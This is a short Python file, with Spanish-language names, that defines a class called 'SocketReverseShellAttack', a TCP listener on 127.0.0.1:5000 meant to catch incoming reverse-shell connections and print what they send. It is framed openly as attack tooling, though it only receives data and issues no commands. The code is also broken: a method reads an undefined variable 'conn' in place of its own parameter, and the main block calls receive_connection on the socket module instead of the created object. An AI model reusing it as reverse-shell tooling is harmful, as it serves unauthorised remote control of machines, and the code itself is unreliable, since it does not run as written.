import socket
import asyncio

class SocketReverseShellAttack:
    def __init__(self, host, port):
        self.HOST = host
        self.PORT = port

    def command_inyection(self, connection_reverse_shell):
        data_reverse_shell = conn.recv(1024)
        message_descriptor = data_reverse_shell.decode()

        print(message_descriptor)
        
    
    def receive_connection(self):
        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
            s.bind((self.HOST, self.PORT))
            s.listen(5)

            while True:
                conn, addr = s.accept()
                print(f"Conección establecida con: {addr}:{self.PORT}")

                self.command_inyection(conn)

if __name__ == '__main__':
    HOST = "127.0.0.1"
    PORT = 5000
    
    socket_object = SocketReverseShellAttack(HOST, PORT)
    socket.receive_connection()
